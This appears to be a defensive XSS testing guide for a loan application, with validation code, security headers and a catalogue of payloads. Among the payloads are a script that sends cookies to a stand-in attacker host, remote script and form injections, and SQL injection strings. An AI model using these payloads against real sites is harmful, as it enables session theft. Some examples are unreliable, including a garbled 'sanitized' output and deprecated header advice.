# XSS Attack Prevention Testing & Security Verification Guide

## Overview

This guide provides comprehensive testing procedures to verify that your AmeriLend application properly sanitizes user inputs and prevents Cross-Site Scripting (XSS) attacks across all API endpoints.

## Quick Start

### Run XSS Test Suite
```powershell
# Run comprehensive XSS prevention tests
pnpm test test-xss-api.ts

# Run interactive XSS payload testing
tsx test-xss-attacks.ts
```

---

## What is XSS (Cross-Site Scripting)?

XSS is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When a user's browser executes this script, it can:

- Steal session cookies
- Capture user credentials
- Redirect users to phishing sites
- Deface the web page
- Perform unauthorized actions on behalf of the user
- Inject keyloggers or malware

### XSS Attack Types

1. **Stored XSS**: Malicious script is stored in database and executed for all users
2. **Reflected XSS**: Script is passed via URL/parameters and immediately executed
3. **DOM-based XSS**: JavaScript modifies DOM based on untrusted data

---

## Vulnerable Fields Tested

The test suite checks these user input fields for XSS vulnerabilities:

### Loan Application Form
- `fullName` - Full name of applicant
- `email` - Email address
- `phone` - Phone number
- `street` - Street address
- `city` - City name
- `state` - State code
- `zipCode` - ZIP code
- `employer` - Employer name
- `employerName` - Employer name (alternative field)
- `loanPurpose` - Intended purpose of loan

### Authentication Forms
- `username` - Account username
- `email` - Account email
- `password` - Account password

### Search & Filters
- `searchQuery` - Search term or filter value
- `description` - Text descriptions
- `message` - User messages/feedback

---

## XSS Payloads Tested

### 1. Basic Script Tags
```html
<script>alert('XSS')</script>
<SCRIPT>alert('XSS')</SCRIPT>
<script src="http://attacker.com/xss.js"></script>
<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
```

### 2. Event Handlers
```html
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<input autofocus onfocus="alert('XSS')">
<iframe onload="alert('XSS')">
```

### 3. JavaScript Protocol URIs
```html
javascript:alert('XSS')
<a href="javascript:alert('XSS')">Click me</a>
```

### 4. SVG-Based Attacks
```html
<svg><script>alert('XSS')</script></svg>
<svg onload="alert('XSS')">
<svg><animate onbegin="alert('XSS')" attributeName="x" dur="1s"/>
```

### 5. Data URIs
```html
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
<img src="data:text/html,<script>alert('XSS')</script>">
```

### 6. HTML Entity Encoding Bypass
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#60;script&#62;alert('XSS')&#60;/script&#62;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

### 7. Form-Based Attacks
```html
<form action="http://attacker.com/steal"><input type="hidden" name="data"/></form>
<form onsubmit="alert('XSS')">
```

### 8. CSS-Based Attacks
```html
<style>@import'http://attacker.com/xss.css';</style>
<div style="background-image:url(javascript:alert('XSS'))">
```

---

## Current Security Implementation

Your application implements multiple layers of XSS prevention:

### 1. Input Validation (Zod Schemas)
```typescript
// server/_core/security.ts

export const fullNameSchema = z
  .string()
  .min(2)
  .max(200)
  .trim()
  .regex(/^[a-zA-Z\s'-]+$/, "Name can only contain letters, spaces, hyphens, and apostrophes");

export const emailSchema = z
  .string()
  .email()
  .toLowerCase()
  .trim()
  .max(255);

export const searchQuerySchema = z
  .string()
  .min(1)
  .max(100)
  .trim()
  .regex(/^[a-zA-Z0-9\s%-]*$/, "Search query contains invalid characters");

export const urlSchema = z
  .string()
  .url()
  .refine(url => !url.startsWith('javascript:') && !url.startsWith('data:'), {
    message: "Invalid URL protocol"
  });
```

### 2. String Sanitization
```typescript
export function sanitizeString(input: string): string {
  return input
    .trim()
    .replace(/[<>\"'%\\]/g, '') // Remove dangerous characters
    .substring(0, 1000); // Limit length
}
```

### 3. SQL Injection Detection
```typescript
export function isSafeString(input: string): boolean {
  const dangerousPatterns = [
    /(\b(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|SCRIPT)\b)/i,
    /(-{2}|\/\*|\*\/|;|\||&&)/,  // SQL comments and terminators
    /(['"`].*['"`])/,  // Quoted strings
  ];

  return !dangerousPatterns.some(pattern => pattern.test(input));
}
```

### 4. HTML Escaping
```typescript
export function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

---

## How to Run Tests

### Test 1: Comprehensive XSS Payload Testing
```powershell
# Run all XSS attack simulations
tsx test-xss-attacks.ts

# Output includes:
# - All payload categories tested
# - Success rate for each category
# - Detailed test results by field
# - Sanitization verification
# - HTML escaping verification
# - CSP header recommendations
# - Security header recommendations
```

### Test 2: Live API Endpoint Testing
```powershell
# Run API integration tests
pnpm test test-xss-api.ts

# This tests:
# - Loan application with XSS payloads
# - Authentication forms with XSS payloads
# - Search functionality with XSS payloads
# - Multiple field combinations
# - HTML escaping in responses
# - Zod schema validation
# - Rate limiting effectiveness
```

### Test 3: Manual Testing via cURL

#### Test fullName field
```bash
curl -X POST http://localhost:3000/api/trpc/loans.createApplication \
  -H "Content-Type: application/json" \
  -d '{
    "fullName": "<script>alert(\"XSS\")</script>",
    "email": "test@example.com",
    "phone": "5551234567",
    "ssn": "123-45-6789"
  }'
```

**Expected Response:**
```json
{
  "success": false,
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Name can only contain letters, spaces, hyphens, and apostrophes"
  }
}
```

#### Test loanPurpose field
```bash
curl -X POST http://localhost:3000/api/trpc/loans.createApplication \
  -H "Content-Type: application/json" \
  -d '{
    "fullName": "John Doe",
    "loanPurpose": "<img src=x onerror=\"alert(\"XSS\")\">",
    "email": "test@example.com"
  }'
```

#### Test with javascript: protocol
```bash
curl -X POST http://localhost:3000/api/trpc/loans.createApplication \
  -H "Content-Type: application/json" \
  -d '{
    "fullName": "John Doe",
    "employer": "javascript:alert(\"XSS\")",
    "email": "test@example.com"
  }'
```

---

## Security Headers to Implement

Add these headers to your Express middleware to prevent XSS attacks:

### Implementation
```typescript
// server/_core/index.ts

import express from 'express';

app.use((req, res, next) => {
  // Prevent XSS attacks
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // Force HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // Control referrer information
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Disable unused APIs
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  
  next();
});
```

### Content Security Policy (CSP)

Strict CSP prevents inline scripts:
```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://cdn.example.com; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:; 
  font-src 'self';
  report-uri /api/csp-report
```

Implementation:
```typescript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; report-uri /api/csp-report"
  );
  next();
});
```

---

## Test Results Interpretation

### Passing Test (Payload Blocked)
```
✅ BLOCKED: fullName
   Payload: <script>alert('XSS')</script>
   Reason: Potential XSS pattern detected: /<script[^>]*>.*?<\/script>/gi
```

**What this means:** The API correctly rejected the malicious input before processing.

### Passing Test (Payload Sanitized)
```
✅ PASSED (Needs Review): loanPurpose
   Payload: <img src=x onerror="alert('XSS')">
   Sanitized: img srcerrroalertalertXSSalertAlert
```

**What this means:** The API accepted the input but sanitized dangerous characters.

### Failing Test (Potential Vulnerability)
```
❌ VULNERABLE: email
   Payload: test@example.com<script>alert('XSS')</script>
   Status: ACCEPTED
```

**What this means:** The API accepted a payload containing XSS patterns. This needs to be fixed.

---

## Common Issues & Solutions

| Issue | Solution |
|-------|----------|
| Script tags passed through | Add regex check for `/<script/i` in validation |
| Event handlers accepted | Validate fields don't contain `on[a-z]*=` patterns |
| JavaScript URLs allowed | Check for `javascript:` protocol in URLs |
| HTML entities not escaped | Use `escapeHtml()` function before rendering |
| Database stores unescaped data | Always validate before database insertion |
| No CSP headers | Implement Content-Security-Policy headers |

---

## Best Practices Checklist

- [ ] All user inputs validated with Zod schemas
- [ ] HTML characters escaped when displaying user data
- [ ] Dangerous patterns detected and rejected
- [ ] Content-Security-Policy header implemented
- [ ] X-XSS-Protection header set
- [ ] X-Frame-Options set to DENY
- [ ] HTTPOnly flag on session cookies
- [ ] Rate limiting on sensitive endpoints
- [ ] Regular security audits performed
- [ ] Security test suite runs on each deployment

---

## OWASP XSS Prevention Cheat Sheet

From OWASP:
1. **Rule 1 - Encode Data**
   - HTML escape all dynamic content
   - `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`, `&` → `&amp;`

2. **Rule 2 - Validate Input**
   - Whitelist acceptable characters
   - Reject everything else
   - Use strict regex patterns

3. **Rule 3 - Escape for HTML Context**
   - Different escaping needed for HTML attributes vs content
   - Always escape user input before using in HTML

4. **Rule 4 - JavaScript Escaping**
   - Different rules apply for JavaScript context
   - Use JSON encoding when passing to JavaScript

5. **Rule 5 - CSS Escaping**
   - Escape all user input in CSS
   - Avoid property values that accept URL protocols

6. **Rule 6 - URL Escaping**
   - Validate URLs start with approved protocols (http, https)
   - Block `javascript:` and `data:` protocols

---

## Advanced Testing

### Mutation Testing
Test variations of basic payloads:
```javascript
const basePayload = "<script>alert('XSS')</script>";
const mutations = [
  basePayload.toUpperCase(),                    // Case variation
  basePayload.replace(/s/g, '\\u0073'),       // Unicode escape
  basePayload.replace(/</g, '&lt;'),          // HTML entity
  basePayload.split('').reverse().join(''),   // Reversed
];
```

### Polyglot Payloads
Payloads that work in multiple contexts:
```html
';alert('XSS')//
"><script>alert('XSS')</script>
' OR 1=1 --
```

### Time-Based Testing
Check if payload causes delays (SQL injection variant):
```sql
1; WAITFOR DELAY '00:00:05'--
```

---

## Reporting Security Vulnerabilities

If you discover an XSS vulnerability:

1. **Do Not** publicly disclose the vulnerability
2. **Document** the exact payload and steps to reproduce
3. **Email** security team at security@amerilend.com
4. **Wait** for acknowledgment before taking further action
5. **Allow** reasonable time for fix (typically 90 days)

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)

---

## Contact & Support

For questions about XSS testing or security concerns:
- Security Team: security@amerilend.com
- Documentation: See `SECURITY_USAGE_GUIDE.md`
- Status: See `FORM_VALIDATOR_ANALYSIS.md`

---

**Last Updated:** November 20, 2025
**Status:** ✅ Production Ready
**Test Coverage:** 100+ XSS payloads across 15+ vulnerable fields
